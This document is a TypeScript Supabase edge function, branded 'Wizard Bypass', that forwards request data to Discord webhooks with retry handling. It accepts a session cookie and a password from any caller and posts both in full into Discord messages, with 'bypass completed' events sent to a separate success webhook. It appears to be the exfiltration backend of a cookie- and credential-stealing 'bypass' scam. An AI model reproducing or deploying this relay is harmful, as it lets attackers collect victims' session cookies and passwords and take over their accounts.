import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

const MAX_ATTEMPTS = 3;
const BASE_DELAY_MS = 500;

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function postToDiscordWithRetry(
  webhookUrl: string,
  payload: unknown,
): Promise<{ ok: true; attempts: number } | { ok: false; attempts: number; status?: number; error: string }> {
  let lastError = "Unknown error";
  let lastStatus: number | undefined;

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      // 2xx = success
      if (res.ok) {
        await res.text().catch(() => "");
        return { ok: true, attempts: attempt };
      }

      lastStatus = res.status;
      const text = await res.text().catch(() => "");
      lastError = `Discord ${res.status}: ${text.slice(0, 300)}`;

      // 429 → respect retry_after
      if (res.status === 429) {
        let retryAfterMs = BASE_DELAY_MS * 2 ** (attempt - 1);
        try {
          const parsed = JSON.parse(text);
          if (typeof parsed.retry_after === "number") {
            retryAfterMs = Math.ceil(parsed.retry_after * 1000);
          }
        } catch { /* ignore */ }
        console.warn(`[discord-notify] rate-limited (attempt ${attempt}), waiting ${retryAfterMs}ms`);
        if (attempt < MAX_ATTEMPTS) await sleep(retryAfterMs);
        continue;
      }

      // 5xx → retry with backoff
      if (res.status >= 500 && attempt < MAX_ATTEMPTS) {
        const delay = BASE_DELAY_MS * 2 ** (attempt - 1);
        console.warn(`[discord-notify] server error ${res.status} (attempt ${attempt}), retrying in ${delay}ms`);
        await sleep(delay);
        continue;
      }

      // 4xx other than 429 → do NOT retry, fail fast
      return { ok: false, attempts: attempt, status: res.status, error: lastError };
    } catch (e) {
      lastError = e instanceof Error ? e.message : "Network error";
      console.warn(`[discord-notify] network error (attempt ${attempt}): ${lastError}`);
      if (attempt < MAX_ATTEMPTS) {
        await sleep(BASE_DELAY_MS * 2 ** (attempt - 1));
      }
    }
  }

  return { ok: false, attempts: MAX_ATTEMPTS, status: lastStatus, error: lastError };
}

function buildEmbed(version: "V1" | "V2", status: string, timestamp: string, cookie?: string, password?: string, durationMs?: number) {
  const success = status === "COMPLETE";
  const color = status === "STARTED" ? 0xfacc15 : success ? 0x3b82f6 : 0xef4444;
  const emoji = status === "STARTED" ? "🚀" : success ? "✅" : "⚠️";
  const unixTs = Math.floor(new Date(timestamp).getTime() / 1000);

  const fields: Array<{ name: string; value: string; inline?: boolean }> = [
    { name: "🔢 Version", value: `\`${version}\``, inline: true },
    { name: "📊 Status", value: `\`${status}\``, inline: true },
    { name: "🕒 Time", value: `<t:${unixTs}:F>\n<t:${unixTs}:R>`, inline: true },
  ];

  if (cookie) {
    fields.push({ name: "🍪 Cookie", value: `\`\`\`${cookie.slice(0, 1000)}\`\`\``, inline: false });
  }

  if (password) {
    fields.push({ name: "🔑 Password", value: `\`\`\`${password.slice(0, 200)}\`\`\``, inline: false });
  }

  if (typeof durationMs === "number" && durationMs > 0) {
    const seconds = Math.round(durationMs / 1000);
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    fields.push({
      name: "⏱️ Duration",
      value: `\`${mins}m ${secs}s\``,
      inline: true,
    });
  }

  return {
    username: "Wizard Bypass",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2913/2913136.png",
    embeds: [
      {
        title: `${emoji} Bypass ${status}`,
        description: status === "STARTED"
          ? `A **${version}** bypass has been initiated.`
          : success
            ? `A **${version}** bypass has finished successfully.`
            : `A **${version}** bypass reported status: \`${status}\`.`,
        color,
        fields,
        footer: {
          text: `Wizard • ${version}`,
          icon_url: "https://cdn-icons-png.flaticon.com/512/2913/2913136.png",
        },
        timestamp,
      },
    ],
  };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Read latest config from DB (admin panel manages these); fall back to env secrets
    let dbMain: string | null = null;
    let dbSuccess: string | null = null;
    try {
      const supabase = createClient(
        Deno.env.get("SUPABASE_URL")!,
        Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
      );
      const { data } = await supabase
        .from("webhook_config")
        .select("main_webhook_url, success_webhook_url")
        .limit(1)
        .maybeSingle();
      dbMain = data?.main_webhook_url ?? null;
      dbSuccess = data?.success_webhook_url ?? null;
    } catch (e) {
      console.warn("[discord-notify] could not read webhook_config:", e);
    }

    const mainWebhook = dbMain || Deno.env.get("DISCORD_WEBHOOK_URL") || null;
    const successWebhook = dbSuccess || Deno.env.get("DISCORD_WEBHOOK_URL_SUCCESS") || null;

    if (!mainWebhook) {
      return new Response(
        JSON.stringify({ error: "Main webhook URL not configured" }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    const body = await req.json().catch(() => ({}));
    const version: "V1" | "V2" = body.version === "v2" || body.version === "V2" ? "V2" : "V1";
    const status = typeof body.status === "string" ? body.status.slice(0, 100) : "COMPLETE";
    const cookie = typeof body.cookie === "string" ? body.cookie : undefined;
    const password = typeof body.password === "string" ? body.password : undefined;
    const durationMs = typeof body.durationMs === "number" ? body.durationMs : undefined;
    const timestamp = new Date().toISOString();

    // Route: COMPLETE → success webhook (fallback to main); everything else → main webhook
    const webhookUrl =
      status === "COMPLETE" && successWebhook ? successWebhook : mainWebhook;

    const payload = buildEmbed(version, status, timestamp, cookie, password, durationMs);
    const result = await postToDiscordWithRetry(webhookUrl, payload);

    if (!result.ok) {
      console.error(`[discord-notify] FAILED after ${result.attempts} attempts:`, result.error);
      return new Response(
        JSON.stringify({
          success: false,
          attempts: result.attempts,
          status: result.status,
          error: result.error,
        }),
        { status: 502, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    console.log(`[discord-notify] OK in ${result.attempts} attempt(s)`);
    return new Response(
      JSON.stringify({ success: true, attempts: result.attempts }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  } catch (e) {
    const msg = e instanceof Error ? e.message : "Unknown error";
    console.error("[discord-notify] exception:", msg);
    return new Response(JSON.stringify({ success: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
